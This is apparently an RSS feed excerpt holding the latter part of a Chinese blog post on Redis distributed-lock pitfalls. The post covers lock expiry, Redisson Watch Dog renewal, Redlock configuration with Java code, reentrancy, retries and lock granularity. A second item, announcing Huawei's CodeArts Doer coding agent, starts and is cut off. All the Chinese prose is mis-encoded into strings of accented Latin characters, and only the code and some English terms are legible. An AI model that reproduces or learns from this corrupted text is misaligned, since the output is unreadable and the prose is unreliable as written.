<h3 id="é®é¢-2éè¿ææåéæ¾ä¸å¡æªåå®éå·²å¤±æ">é®é¢ 2ï¼éè¿ææåéæ¾ââä¸å¡æªåå®éå·²å¤±æ</h3>
<p><strong>æå </strong>ï¼éçè¿ææ¶é´è®¾ç½®è¿ç­ï¼èä¸å¡é»è¾æ§è¡èæ¶è¿é¿ï¼å¯¼è´éå¨ä¸å¡å®æåå°±èªå¨è¿æéæ¾ï¼å¶ä»æå¡å¯è¶æºå éï¼å¼åå¹¶åå²çªãæ¯å¦éè®¾ä¸º 30 ç§è¿æï¼ä½æ°æ®åºå¤ææ¥è¯¢ãç¬¬ä¸æ¹æ¥å£è°ç¨èæ¶ 40 ç§ï¼å°±ä¼åºç°éæåå¤±æã</p>
<p><strong>è¡¨ç°</strong>ï¼ä¸å¡æ§è¡ä¸­éè¢«éæ¾ï¼å¤ä¸ªæå¡åæ¶æä½èµæºï¼åºç°æ°æ®éè¯¯ï¼ä¸é®é¢å·æéæºæ§ï¼åå³äºä¸å¡èæ¶æ¯å¦è¶è¿è¿ææ¶é´ï¼ã</p>
<p><strong>è§£å³æ¹æ¡</strong>ï¼å¼å¥âéç»­çº¦ï¼Watch Dogï¼âæºå¶ãæå¡æåå éåï¼å¯å¨åå°å®æ¤çº¿ç¨ï¼æ¯ééè¿ææ¶é´ç 1/3 ï¼å¦ 10 ç§ï¼æ£æ¥éæ¯å¦ä»è¢«èªèº«ææï¼è¥ææåå»¶é¿éçè¿ææ¶é´ï¼éç½®ä¸º 30 ç§ï¼ï¼ç´å°ä¸å¡å®æä¸»å¨éæ¾éã</p>
<p>å®éå¼åä¸­æ éæå¨å®ç°ï¼Redisson æ¡æ¶åç½® Watch Dog æºå¶ï¼å éåèªå¨ç»­çº¦ï¼å½»åºè§£å³éæåéæ¾é®é¢ã</p>
<h3 id="é®é¢-3redis-åç¹æééæå¡æ´ä½ä¸å¯ç¨">é®é¢ 3ï¼Redis åç¹æéââéæå¡æ´ä½ä¸å¯ç¨</h3>
<p><strong>æå </strong>ï¼Redis éç¨åç¹é¨ç½²ï¼å½ Redis æå¡å®æºï¼å¦è¿ç¨å´©æºãæå¡å¨æ­çµï¼ï¼ææåå¸å¼éçå éãéæ¾æä½é½ä¼å¤±è´¥ï¼å¯¼è´åå¸å¼ç³»ç»çå¹¶åæ§å¶æºå¶å´©æºï¼æ æ³æ­£å¸¸å¤çèµæºç«äºã</p>
<p><strong>è¡¨ç°</strong>ï¼ææä¾èµåå¸å¼éçä¸å¡æ¥å£æ¥éï¼æ æ³æ§è¡ï¼å¦åºå­æ£åãè®¢ååå»ºæ¥å£ï¼ï¼çè³å¼åæå¡éªå´©ã</p>
<p><strong>è§£å³æ¹æ¡</strong>ï¼éç¨ Redis é«å¯ç¨éç¾¤é¨ç½²ï¼ä¸¤ç§ä¸»æµæ¹æ¡æééæ©ï¼</p>
<ol>
<li>
<p><strong>ä¸»ä»å¤å¶ + å¨åµæ¨¡å¼</strong>ï¼é¨ç½² 1 ä¸»å¤ä» Redis éç¾¤ï¼å¨åµå®æ¶çæ§ä¸»èç¹ç¶æï¼ä¸»èç¹å®æºæ¶èªå¨å°ä»èç¹åæ¢ä¸ºä¸»èç¹ï¼ä¿è¯ Redis æå¡è¿ç»­æ§ãç¼ºç¹æ¯å­å¨âèè£âé£é©ï¼ä¸»ä»æ°æ®åæ­¥å»¶è¿å¯¼è´éä¸¢å¤±ï¼ï¼éåå¯¹ä¸è´æ§è¦æ±ä¸è¬çåºæ¯ã</p>
</li>
<li>
<p><strong>Redlock ç®æ³</strong>ï¼åè³å° 3 ä¸ªç¬ç«ç Redis ä¸»èç¹åèµ·å éè¯·æ±ï¼ä»å½è¶è¿åæ°èç¹å éæåï¼ä¸æ»èæ¶ä¸è¶è¿è¶æ¶æ¶é´ï¼æç®å éæåãå³ä½¿é¨åèç¹å®æºï¼åªè¦å¤æ°èç¹æ­£å¸¸ï¼éæå¡å°±å¯ç¨ï¼å½»åºé¿ååç¹æéåèè£é®é¢ï¼éåé«ä¸è´æ§åºæ¯ãRedisson å·²åç½® Redlock å®ç°ï¼å¼ç®±å³ç¨ï¼ä»¥ä¸æ¯å®æ´å®æéç½®ä¸ä»£ç ï¼</p>
</li>
</ol>
<h4 id="1-å¤ç»ç¬ç«-redis-èç¹éç½®yml">1. å¤ç»ç¬ç« Redis èç¹éç½®ï¼YMLï¼</h4>
<p>Redlock è¦æ±èç¹ç©çç¬ç«ï¼é¿ååä¸æºæ¿æéçµè¿å¤ç»èç¹ï¼ï¼æ¯ç»èç¹å¯åç¬é¨ç½²ä¸»ä»+å¨åµæåå¯ç¨æ§ï¼3 ç»èç¹å®æ´éç½®å¦ä¸ï¼</p>
<pre><code class="language-yaml">spring:
  redis:
    # Redlock ä¸ç¨å¤ç»ç¬ç«èç¹éç½®
    redlock:
      # ç¬¬ä¸ç»èç¹ï¼å¯é¨ç½²ä¸»ä»+å¨åµï¼
      node1:
        host: 192.168.1.101
        port: 6379
        password: 123456
        database: 0
        timeout: 5000  # è¿æ¥è¶æ¶æ¶é´ï¼æ¯«ç§ï¼
      # ç¬¬äºç»èç¹ï¼ç¬ç«æå¡å¨ï¼ä¸ç¬¬ä¸ç»æ å³èï¼
      node2:
        host: 192.168.1.102
        port: 6379
        password: 123456
        database: 0
        timeout: 5000
      # ç¬¬ä¸ç»èç¹ï¼ç¬ç«æå¡å¨ï¼å»ºè®®è·¨æºæ¿ï¼
      node3:
        host: 192.168.1.103
        port: 6379
        password: 123456
        database: 0
        timeout: 5000
</code></pre>
<h4 id="2-redisson-å®¢æ·ç«¯éç½®å¤èç¹å®ä¾å">2. Redisson å®¢æ·ç«¯éç½®ï¼å¤èç¹å®ä¾åï¼</h4>
<p>éè¿éç½®ç±»è¯»å YML ä¿¡æ¯ï¼åå»ºå¯¹åº RedissonClient å®ä¾ï¼ä¿è¯æ¯ç»èç¹ç¬ç«è¿æ¥ï¼</p>
<pre><code class="language-java">@Configuration
public class RedissonRedlockConfig {

    // ç¬¬ä¸ç» Redlock èç¹å®¢æ·ç«¯
    @Bean(name = "redlockClient1")
    public RedissonClient redlockClient1(
            @Value("${spring.redis.redlock.node1.host}") String host,
            @Value("${spring.redis.redlock.node1.port}") int port,
            @Value("${spring.redis.redlock.node1.password}") String password,
            @Value("${spring.redis.redlock.node1.database}") int database,
            @Value("${spring.redis.redlock.node1.timeout}") int timeout) {
        Config config = new Config();
        // åèç¹æ¨¡å¼ï¼è¥ä¸ºéç¾¤ï¼å¯æ¹ç¨ useSentinelServers éç½®å¨åµï¼
        config.useSingleServer()
                .setAddress("redis://" + host + ":" + port)
                .setPassword(password)
                .setDatabase(database)
                .setTimeout(timeout);
        return Redisson.create(config);
    }

    // ç¬¬äºç» Redlock èç¹å®¢æ·ç«¯
    @Bean(name = "redlockClient2")
    public RedissonClient redlockClient2(
            @Value("${spring.redis.redlock.node2.host}") String host,
            @Value("${spring.redis.redlock.node2.port}") int port,
            @Value("${spring.redis.redlock.node2.password}") String password,
            @Value("${spring.redis.redlock.node2.database}") int database,
            @Value("${spring.redis.redlock.node2.timeout}") int timeout) {
        Config config = new Config();
        config.useSingleServer()
                .setAddress("redis://" + host + ":" + port)
                .setPassword(password)
                .setDatabase(database)
                .setTimeout(timeout);
        return Redisson.create(config);
    }

    // ç¬¬ä¸ç» Redlock èç¹å®¢æ·ç«¯
    @Bean(name = "redlockClient3")
    public RedissonClient redlockClient3(
            @Value("${spring.redis.redlock.node3.host}") String host,
            @Value("${spring.redis.redlock.node3.port}") int port,
            @Value("${spring.redis.redlock.node3.password}") String password,
            @Value("${spring.redis.redlock.node3.database}") int database,
            @Value("${spring.redis.redlock.node3.timeout}") int timeout) {
        Config config = new Config();
        config.useSingleServer()
                .setAddress("redis://" + host + ":" + port)
                .setPassword(password)
                .setDatabase(database)
                .setTimeout(timeout);
        return Redisson.create(config);
    }
}
</code></pre>
<h4 id="3-redlock-å ééæ¾éä¸å¡ä»£ç ">3. Redlock å é/éæ¾éä¸å¡ä»£ç </h4>
<p>éè¿ RedissonRedLock ç»åå¤èç¹éï¼èªå¨è§¦åæç¥¨é»è¾ï¼å¼å®¹æ®ééç¨æ³ï¼åç½® Watch Dog ç»­çº¦ï¼</p>
<pre><code class="language-java">@Service
public class StockService {

    @Autowired
    @Qualifier("redlockClient1")
    private RedissonClient redlockClient1;

    @Autowired
    @Qualifier("redlockClient2")
    private RedissonClient redlockClient2;

    @Autowired
    @Qualifier("redlockClient3")
    private RedissonClient redlockClient3;

    @Autowired
    private StockMapper stockMapper;

    public void deductStock(Long productId) {
        // 1. çæç»ä¸éKeyï¼è·åå¤èç¹éå¯¹è±¡
        String lockKey = "lock:stock:" + productId;
        RLock lock1 = redlockClient1.getLock(lockKey);
        RLock lock2 = redlockClient2.getLock(lockKey);
        RLock lock3 = redlockClient3.getLock(lockKey);

        // 2. ç»åä¸ºRedlockéï¼è§¦åå¤èç¹æç¥¨
        RedissonRedLock redLock = new RedissonRedLock(lock1, lock2, lock3);

        try {
            // 3. å éï¼1ç§åç­å¾èç¹ååºï¼éè¿ææ¶é´30ç§ï¼åç½®ç»­çº¦ï¼
            boolean locked = redLock.tryLock(1000, 30000, TimeUnit.MILLISECONDS);
            if (locked) {
                // 4. æ ¸å¿ä¸å¡ï¼åºå­æ£åï¼ä»ä¿çéåå¿è¦æä½ï¼
                Stock stock = stockMapper.selectById(productId);
                if (stock != null &amp;&amp; stock.getCount() &gt; 0) {
                    stock.setCount(stock.getCount() - 1);
                    stockMapper.updateById(stock);
                }
            } else {
                // å éå¤±è´¥ååº
                throw new RuntimeException("ç³»ç»ç¹å¿ï¼è¯·ç¨ååè¯");
            }
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
            throw new RuntimeException("æä½è¢«ä¸­æ­ï¼è¯·éè¯");
        } finally {
            // 5. å®å¨éæ¾éï¼ä»å½åçº¿ç¨ææéæ¶æ§è¡
            if (redLock.isHeldByCurrentThread()) {
                redLock.unlock();
            }
        }
    }
}
</code></pre>
<p>å³é®è¯´æï¼â  å¤ç»èç¹éç©çéç¦»ï¼è·¨æºæ¿é¨ç½²å¯æåå®¹éï¼â¡ 3 ç»èç¹æå¤åè®¸ 1 ç»æéï¼è¶è¿åæ°èç¹å éæåå³çæï¼â¢ éæ¾éæ¶èªå¨åæ­¥æ¸çææèç¹éæ°æ®ï¼æ éæå¨åè°ã</p>
<h3 id="é®é¢-4éæ æ³éå¥åµå¥ä¸å¡æ­»é">é®é¢ 4ï¼éæ æ³éå¥ââåµå¥ä¸å¡æ­»é</h3>
<p><strong>æå </strong>ï¼åºç¡å®ç°çéä¸æ¯æéå¥ï¼å³åä¸æå¡çåä¸çº¿ç¨å¨ææéçæåµä¸ï¼åæ¬¡è¯·æ±å åä¸æéä¼å¤±è´¥ãå¸ååºæ¯ï¼æå¡ A å éåï¼æ§è¡çæ¹æ³ä¸­åè°ç¨äºå¦ä¸ä¸ªéè¦å åä¸æéçæ¹æ³ï¼ç¬¬äºæ¬¡å éå¤±è´¥ï¼å¯¼è´çº¿ç¨é»å¡ï¼å¼åæ­»éã</p>
<p><strong>è¡¨ç°</strong>ï¼ä¸å¡çº¿ç¨é»å¡ï¼æ¥å£è¶æ¶æ ååºï¼ææ¥ååç°æ¯åä¸çº¿ç¨éå¤å éè¢«æã</p>
<p><strong>è§£å³æ¹æ¡</strong>ï¼å®ç°å¯éå¥éæºå¶ãéç value å­å¨âå¯ä¸æ è¯ + éå¥æ¬¡æ°âï¼ç¬¬ä¸æ¬¡å éæ¶å­å¥æ è¯åæ¬¡æ° 1ï¼åä¸çº¿ç¨åæ¬¡å éæ¶ï¼éªè¯æ è¯ä¸è´ï¼å°æ¬¡æ°å  1ï¼éæ¾éæ¶ï¼æ¬¡æ°å 1ï¼ç´å°æ¬¡æ°ä¸º 0 æå é¤é®å½»åºéæ¾éã</p>
<p>æå¨å®ç°é»è¾å¤æï¼æ¨èä½¿ç¨ Redisson ç RLock æ¥å£ï¼å¤©ç¶æ¯æå¯éå¥ï¼ç¨æ³ä¸æ¬å° synchronized éä¸è´ï¼æ éé¢å¤å¼åã</p>
<h3 id="é®é¢-5ä¸»ä»åæ¢éä¸¢å¤±èè£éç¾¤ç¯å¢ä¸çéå½¢å">é®é¢ 5ï¼ä¸»ä»åæ¢éä¸¢å¤±ï¼èè£ï¼ââéç¾¤ç¯å¢ä¸çéå½¢å</h3>
<p><strong>æå </strong>ï¼Redis ä¸»ä»éç¾¤ä¸­ï¼ä¸»èç¹å­å¨éæ°æ®åï¼å°æªåæ­¥å°ä»èç¹å°±å®æºï¼å¨åµå°ä»èç¹åæ¢ä¸ºä¸»èç¹ï¼æ°ä¸»èç¹æ è¯¥éæ°æ®ï¼å¶ä»æå¡å¯éæ°å éï¼å¯¼è´åéå¤±æï¼åºç°å¤ä¸ªæå¡ææéçæåµãè¿æ¯ä¸»ä» + å¨åµæ¨¡å¼çåºæé£é©ã</p>
<p><strong>è¡¨ç°</strong>ï¼ä¸»ä»åæ¢åï¼åææéçæå¡ä»å¨æ§è¡ä¸å¡ï¼æ°æå¡å´è½å éæåï¼å¼åæ°æ®å²çªï¼ä¸é®é¢é¾ä»¥å¤ç°ï¼ä»åçå¨ä¸»ä»åæ¢ç¬é´ï¼ã</p>
<p><strong>è§£å³æ¹æ¡</strong>ï¼</p>
<ul>
<li>
<p>ä½ä¸è´æ§åºæ¯ï¼å¼å¯ Redis ä¸»ä»åæ­¥çâæä¹å + ç­å¾åæ­¥ç¡®è®¤âï¼ä¸»èç¹åå¥éæ°æ®åï¼ç­å¾è³å° 1 ä¸ªä»èç¹åæ­¥å®æåè¿åå éæåï¼éä½éä¸¢å¤±æ¦çï¼ä»æ æ³å®å¨é¿åï¼ã</p>
</li>
<li>
<p>é«ä¸è´æ§åºæ¯ï¼æ¾å¼ä¸»ä» + å¨åµæ¨¡å¼ï¼æ¹ç¨ Redlock ç®æ³ï¼éè¿å¤ä¸»èç¹æç¥¨æºå¶ï¼ä»æ ¹æºä¸è§£å³èè£å¯¼è´çéä¸¢å¤±é®é¢ã</p>
</li>
</ul>
<h3 id="é®é¢-6å éå¤±è´¥æ éè¯ç­ç¥ä¸å¡å¶åå¤±è´¥">é®é¢ 6ï¼å éå¤±è´¥æ éè¯ç­ç¥ââä¸å¡å¶åå¤±è´¥</h3>
<p><strong>æå </strong>ï¼å éæ¶ä»å°è¯ä¸æ¬¡ï¼è¥å ç½ç»æ³¢å¨ãRedis ä¸´æ¶ç¹å¿å¯¼è´å éå¤±è´¥ï¼ç´æ¥æåºå¼å¸¸ï¼å¯¼è´ä¸å¡æ§è¡å¤±è´¥ãåå¸å¼ç¯å¢ä¸­ï¼ç½ç»æå¨ãRedis ç¬æ¶ååå¤§æ¯å¸¸è§æåµï¼æ éè¯ç­ç¥ä¼æ¾å¤§è¿ç±»é®é¢çå½±åã</p>
<p><strong>è¡¨ç°</strong>ï¼é¨åç¨æ·æä½å¤±è´¥ï¼å¦æäº¤è®¢åæç¤ºâç³»ç»ç¹å¿âï¼ï¼éè¯åå¯æåï¼é®é¢å·æéæºæ§ã</p>
<p><strong>è§£å³æ¹æ¡</strong>ï¼å®ç°å¸¦éå¶çéè¯æºå¶ï¼å éå¤±è´¥åï¼é´éä¸å®æ¶é´ï¼å¦ 100msï¼éè¯ï¼åæ¶è®¾ç½®æå¤§éè¯æ¬¡æ°ï¼å¦ 3 æ¬¡ï¼åæ»è¶æ¶æ¶é´ï¼å¦ 1 ç§ï¼ï¼é¿åæ ééè¯å¯¼è´ Redis ååè¿å¤§ï¼ä¹è½æåå éæåçã</p>
<pre><code class="language-java">// å¸¦éè¯çå éé»è¾ï¼Spring Data Redis ç¤ºä¾ï¼
public boolean lockWithRetry(String key, String value, long expireMs, int maxRetry, long retryIntervalMs) {
    for (int i = 0; i &lt; maxRetry; i++) {
        Boolean result = redisTemplate.opsForValue().setIfAbsent(key, value, expireMs, TimeUnit.MILLISECONDS);
        if (Boolean.TRUE.equals(result)) {
            return true;
        }
        try {
            Thread.sleep(retryIntervalMs);
        } catch (InterruptedException e) {
            Thread.currentThread().interrupt();
            return false;
        }
    }
    return false;
}
</code></pre>
<h3 id="é®é¢-7é¿æ¶é´ææéç³»ç»å¹¶åééª¤é">é®é¢ 7ï¼é¿æ¶é´ææéââç³»ç»å¹¶åééª¤é</h3>
<p><strong>æå </strong>ï¼å¨éçèå´åæ§è¡èæ¶æä½ï¼å¦å¤ææ°æ®åºæ¥è¯¢ãç¬¬ä¸æ¹æ¥å£è°ç¨ãå¤§éæ°æ®å¤çï¼ï¼å¯¼è´éæææ¶é´è¿é¿ï¼å¶ä»æå¡è¯·æ±è¯¥éæ¶è¢«é¿æ¶é´é»å¡ï¼ç³»ç»ååéå¤§å¹ä¸éã</p>
<p><strong>è¡¨ç°</strong>ï¼ä¾èµè¯¥éçæ¥å£ååºæ¶é´åé¿ï¼å¹¶åéä¸ä¸å»ï¼çæ§æ¾ç¤ºå¤§éçº¿ç¨é»å¡å¨å éç¯èã</p>
<p><strong>è§£å³æ¹æ¡</strong>ï¼</p>
<ul>
<li>
<p>ç²¾ç®éåä¸å¡ï¼ä»å°âèµæºç«äºæ ¸å¿é»è¾âï¼å¦åºå­æ£åãè®¢åç¶æä¿®æ¹ï¼æ¾å¥éåï¼éæ ¸å¿é»è¾ï¼å¦æ¥å¿è®°å½ãæ¶æ¯æ¨éï¼ç§»è³éå¤æ§è¡ã</p>
</li>
<li>
<p>å¼æ­¥åå¤çï¼è¥éåå¿é¡»æ§è¡èæ¶æä½ï¼å°å¶å¼æ­¥åï¼å¦ç¨çº¿ç¨æ± ãæ¶æ¯éåï¼ï¼ç¼©ç­éæææ¶é´ã</p>
</li>
<li>
<p>è®¾ç½®éææè¶æ¶é¢è­¦ï¼éè¿çæ§å·¥å·ç»è®¡éæææ¶é´ï¼è¶è¿éå¼ï¼å¦ 20 ç§ï¼æ¶åè­¦ï¼åæ¶ææ¥èæ¶ä¸å¡ã</p>
</li>
</ul>
<h3 id="é®é¢-8é-key-è®¾è®¡ä¸å½éç²åº¦é®é¢å¼åå¹¶åç¶é¢">é®é¢ 8ï¼é key è®¾è®¡ä¸å½ââéç²åº¦é®é¢å¼åå¹¶åç¶é¢</h3>
<p><strong>æå </strong>ï¼é key ç²åº¦å¤ªç²ï¼å¦ç¨âlock:stockâä½ä¸ºææååçåºå­éï¼ï¼å¯¼è´ææååçåºå­æä½é½äºæ¥ï¼å³ä½¿æä½ä¸åååï¼ä¹éæéç­å¾ééæ¾ï¼å½»åºä¸§å¤±åå¸å¼ç³»ç»çå¹¶åä¼å¿ã</p>
<p><strong>è¡¨ç°</strong>ï¼ç³»ç»å¹¶åéæä½ï¼ä¸åååçåºå­æ£åè¯·æ±ä¸²è¡æ§è¡ï¼æ¥å£ååéè¿ä½äºé¢æã</p>
<p><strong>è§£å³æ¹æ¡</strong>ï¼ç²¾ç»åè®¾è®¡é keyï¼æå·ä½èµæºæ è¯æåéãæ¯å¦åºå­éï¼ç¨âlock:stock:1001âï¼1001 ä¸ºåå IDï¼ä½ä¸ºé keyï¼ä»å¯¹åä¸ååçåºå­æä½äºæ¥ï¼ä¸åååå¯å¹¶è¡å¤çï¼å¤§å¹æåå¹¶åéã</p>
<p>å»¶ä¼¸ï¼é«å¹¶ååºæ¯ä¸ï¼å¯è¿ä¸æ­¥ç¨âåæ®µéâæåèµæºï¼å¦å°åå ID åå¸å° 10 ä¸ªåæ®µï¼é key ä¸ºâlock:stock:segment:1âï¼ï¼åä¸åæ®µäºæ¥ï¼ä¸ååæ®µå¹¶è¡ï¼è¿ä¸æ­¥æåå¹¶åè½åã</p>
<h3 id="é®é¢-9ç½ç»ååºå¯¼è´éç¶æä¸ä¸è´æç«¯åºæ¯ä¸çéæ£">é®é¢ 9ï¼ç½ç»ååºå¯¼è´éç¶æä¸ä¸è´ââæç«¯åºæ¯ä¸çéæ£</h3>
<p><strong>æå </strong>ï¼åå¸å¼ç¯å¢ä¸­åºç°ç½ç»ååºï¼ææéçæå¡ä¸ Redis éç¾¤éç¦»ï¼æ æ³ä¸»å¨éæ¾éï¼ä¹æ æ³æ¥æ¶éç»­çº¦ä¿¡å·ï¼éè¿æåï¼å¶ä»æå¡å éæåï¼ç½ç»æ¢å¤åï¼åææéçæå¡è¯¯ä»¥ä¸ºéä»ææï¼ç»§ç»­æä½èµæºï¼å¯¼è´æ°æ®å²çªã</p>
<p><strong>è¡¨ç°</strong>ï¼æç«¯ç½ç»å¼å¸¸åï¼åºç°æ°æ®ä¸ä¸è´ï¼ä¸é®é¢é¾ä»¥ææ¥ï¼ä¸ç½ç»ååºæ¶é´ãéè¿ææ¶é´å¼ºç¸å³ï¼ã</p>
<p><strong>è§£å³æ¹æ¡</strong>ï¼</p>
<ul>
<li>
<p>å¼å¥ä¸å¡æ ¡éªæºå¶ï¼æä½èµæºåï¼åæ¬¡æ ¡éªèµæºç¶æï¼å¦æ£ååºå­åï¼æ£æ¥åºå­æ¯å¦ä¸é¢æä¸è´ï¼ï¼é¿ååºäºè¿æéçæ ææä½ã</p>
</li>
<li>
<p>ç¼©ç­éè¿ææ¶é´ï¼ç»å Watch Dog æºå¶ï¼å°åºç¡è¿ææ¶é´è®¾ç­ï¼å¦ 10 ç§ï¼ï¼åå°ç½ç»ååºå¯¼è´çéç¶æä¸ä¸è´çªå£ã</p>
</li>
<li>
<p>ä½¿ç¨ Redlock ç®æ³ï¼å¤ä¸»èç¹æç¥¨æºå¶ï¼å¯éä½ç½ç»ååºå¯¹éç¶æçå½±åï¼æåä¸è´æ§ã</p>
</li>
</ul>
<h2 id="äºçäº§é¿åæ»ç»">äºãçäº§é¿åæ»ç»</h2>
<p>Redis åå¸å¼éçé®é¢ï¼å¤§å¤ä¸æ¯ Redis æ¬èº«çç¼ºé·ï¼èæ¯å¯¹åå¸å¼åºæ¯çå¤ææ§èèä¸è¶³ãç»åå®æç»éªï¼æ»ç» 3 ä¸ªæ ¸å¿é¿åååï¼</p>
<ol>
<li>
<p>ä¼åä½¿ç¨æçæ¡æ¶ï¼æ¾å¼æå¨å®ç°åå¸å¼éï¼Redisson å·²å°è£è§£å³ä¸è¿°ææé®é¢ï¼å¼ç®±å³ç¨ï¼ç¨³å®æ§è¿é«äºèªå®ä¹å®ç°ã</p>
</li>
<li>
<p>å¹éä¸å¡åºæ¯éåï¼é«ä¸è´æ§ãé«å¯ç¨åºæ¯ç¨ Redlock ç®æ³ï¼ä¸è¬åºæ¯ç¨ä¸»ä» + å¨åµæ¨¡å¼ï¼æ ¹æ®å¹¶åéè®¾è®¡éç²åº¦ï¼ç²¾ç»å/åæ®µéï¼ã</p>
</li>
<li>
<p>å®åçæ§ä¸ååºï¼çæ§éæææ¶é´ãå éæåçãRedis éç¾¤ç¶æï¼è®¾ç½®åè­¦éå¼ï¼å éå¤±è´¥ãéè¿æç­åºæ¯ï¼éæä¸å¡ååºç­ç¥ï¼éè¯ãè¿ååå¥½æç¤ºãéåç¼å­ï¼ã</p>
</li>
</ol>
<p>æ»ä¹ï¼Redis åå¸å¼éçæ ¸å¿æ¯âå¼é¡¾äºæ¥æ§ä¸é«å¯ç¨âï¼é¿å¼ä¸è¿°é®é¢åï¼æè½çæ­£æä¸ºåå¸å¼ç³»ç»è§£å³å¹¶åå²çªçå©å¨ï¼èéç³»ç»çæ°ç¶é¢ã</p>

</div>
<div id="MySignature" role="contentinfo">
    
<p>â¤ï¸ å¦æä½ åæ¬¢è¿ç¯æç« ï¼è¯·ç¹èµæ¯æï¼ ð åæ¶æ¬¢è¿å³æ³¨æçåå®¢ï¼è·åæ´å¤ç²¾å½©åå®¹ï¼</p>

<p>æ¬ææ¥èªåå®¢å­ï¼ä½èï¼<a href="https://www.cnblogs.com/sun-10387834/" target="_blank">ä½ç¥è®©ææ¥å·¡å±±</a>ï¼è½¬è½½è¯·æ³¨æåæé¾æ¥ï¼<a href="https://www.cnblogs.com/sun-10387834/p/19493006" target="_blank">https://www.cnblogs.com/sun-10387834/p/19493006</a></p>


</div>
<div class="clear"></div>

            </div>
            <div class="postDesc">posted @ 
<span id="post-date" data-last-update-days="0" data-date-updated="2026-01-20 19:24">2026-01-20 19:23</span>&nbsp;
<a href="https://www.cnblogs.com/sun-10387834">ä½ç¥è®©ææ¥å·¡å±±</a>&nbsp;
éè¯»(<span id="post_view_count">7</span>)&nbsp;
è¯è®º(<span id="post_comment_count">0</span>)&nbsp;
&nbsp;
<a href="javascript:void(0)" onclick="AddToWz(19493006);return false;">æ¶è</a>&nbsp;
<a href="javascript:void(0)" onclick="reportManager.report({ currentUserId: '', targetType: 'blogPost', targetId: '19493006', targetLink: 'https://www.cnblogs.com/sun-10387834/p/19493006', title: 'å¹²è´§æ»¡æ»¡ï¼Redis åå¸å¼éå¿é¿ç 8 å¤§é®é¢åè§£å³æ¹æ¡' })">ä¸¾æ¥</a>
</div>
         ]]>
    </description>
    </item>
<item>
    <title><![CDATA[ åä¸ºäºåå¸CodeArts Doerä»£ç æºè½ä½ä¸ªäººçï¼ä¸é®å¼å¯ä½ çç¼ç èªå¨é©¾é©¶æ¨¡å¼ ]]></title>
    <link>https://www.cnblogs.com/huaweiyun/p/19508288</link>
    <guid>6f2339ae6a62e712ab5ac97d24c28bf9</guid>
    <description>
    <![CDATA[ 
            <h1 class="postTitle">
                <a id="cb_post_title_url" class="postTitle2 vertical-middle" href="https://www.cnblogs.com/huaweiyun/p/19508288" title="åå¸äº 2026-01-20 18:34">
    <span role="heading" aria-level="2">åä¸ºäºåå¸CodeArts Doerä»£ç æºè½ä½ä¸ªäººçï¼ä¸é®å¼å¯ä½ çç¼ç èªå¨é©¾é©¶æ¨¡å¼</span>
    

</a>

            </h1>
            <div class="clear"></div>
            <div class="postBody">
                <div id="cnblogs_post_body" class="blogpost-body blogpost-body-html">
<div style="text-align: left" align="center">2026å¹´1æ16æ¥ï¼åä¸ºäºæ­£å¼åå¸CodeArts Doerä»£ç æºè½ä½ãè¿æ¬¾æ·±åº¦èåAIåçè½åçæºè½ç¼ç äº§åï¼éæäºAI IDEãCode AgentãCodebaseä»£ç ä»æ·±åº¦çè§£ç­æ ¸å¿è½åï¼æ´æç åéæ±ãç²¾éç¼ç ãåç¨ç¾å¨ï¼ä¸ºå¼åèå¸¦æ¥çæ°ç åä½éªã</div>
<div style="text-align: left">&nbsp;<img alt="" data-src="https://img2024.cnblogs.com/blog/2030258/202601/2030258-20260120183417566-1436339979.png" class="lazyload"></div>
<p>æ¬æ¬¡åå¸çä¸å¤§æ°åç¹æ§ï¼ AI IDEãCode AgentãCodebase</p>
<p><strong>AI IDE</strong><strong>ï¼åçæºè½ï¼çæ°å¼åä½éª</strong></p>
<p>AI IDEä»¥AIåçä¸ºèµ·ç¹ï¼å°ç¼ç è½åä¸æºè½ä½æ·±åº¦èåï¼ä¸ºå¼åèå¸¦æ¥æ´èªç¶çå¼åå·¥ä½æµï¼ä»éæ±æè¿°å°ä»»å¡æè§£ï¼ä»æ¥å£è®¾è®¡å°ä»£ç è½å°ï¼å¨IDEåå³å¯å®æé­ç¯ãåæ¶ï¼AI IDEåç½®ä¸å®¶æè½ä¸ç²¾éå·¥å·ï¼å½¢æâäºº+AI+å·¥å·âçååå¼åå¹³å°ï¼å¼åèä¸æ³¨ä¸å¡å¤æ­ä¸å³é®å³ç­ï¼AI IDEè´è´£é«é¢ãéå¤ãæéæ¼çå·¥ç¨åå·¥ä½ï¼è®©ä½éªä»âå¤å¼çªå£æ¾å·¥å·âåçº§ä¸ºâå¨ä¸ä¸ªå·¥ä½å°éå®æäº¤ä»âã</p>
<p>&nbsp;<img alt="" data-src="https://img2024.cnblogs.com/blog/2030258/202601/2030258-20260120183416252-348731928.png" class="lazyload"></p>
<p><strong>Code Agent</strong><strong>ï¼å·¦æç¼ç èªç±ï¼å³æè§èé«æ</strong></p>
<p>CodeArts Doerä»£ç æºè½ä½æä¾ä¸¤ç§é¢åä¸åé¶æ®µä¸è¯æ±çå¼åæ¨¡å¼ï¼</p>
<p>æ¢ç´¢æ¨¡å¼ï¼æ´å¼ºè°äººæºååä¸åé åãä½ å¯ä»¥ç¨èªç¶è¯­è¨æè¿°éæ±ç®æ ï¼è®©CodeArts Doerä»£ç æºè½ä½ä¸ºä½ è§åå¹¶åè§£é¡¹ç®ä»»å¡ï¼çæé¡¹ç®çº§ä»£ç ãè¿è¡Agentç¥è¯å¢å¼ºãä»£ç ç»­åï¼å¹¶å¨å¤è½®å¯¹è¯ä¸­æç»­è¿­ä»£ï¼æâæ³æ³âå¿«éæ¨è¿å°âå¯è¿è¡âã</p>
<p>è§èæ¨¡å¼ï¼æ´å¼ºè°è´¨éãå®å¨ä¸ä¸è´æ§ãè§èé©±å¨å¼åï¼è®©ä»£ç éµä»æ åæµç¨çæãå¨çæä¸ä¿®æ¹ä»£ç è¿ç¨ä¸­å¯¹é½è§èï¼æåä»£ç çå¯è¯»æ§ãå¯ç»´æ¤æ§ï¼åæ¶å¨å³é®ç¹è¿è¡å®å¨ä¸è´¨éæ ¡éªï¼å¸®å©å¢éæâå¿«âå»ºç«å¨âç¨³âçåºç¡ä¸ã</p>
<p><img alt="" data-src="https://img2024.cnblogs.com/blog/2030258/202601/2030258-20260120183416252-348731928.png" class="lazyload"></p>
<p><strong>Codebase</strong><strong>ï¼ä»£ç ä»æ·±åº¦çè§£ï¼ææä½ çAIç¼ç ä¸å®¶</strong></p>
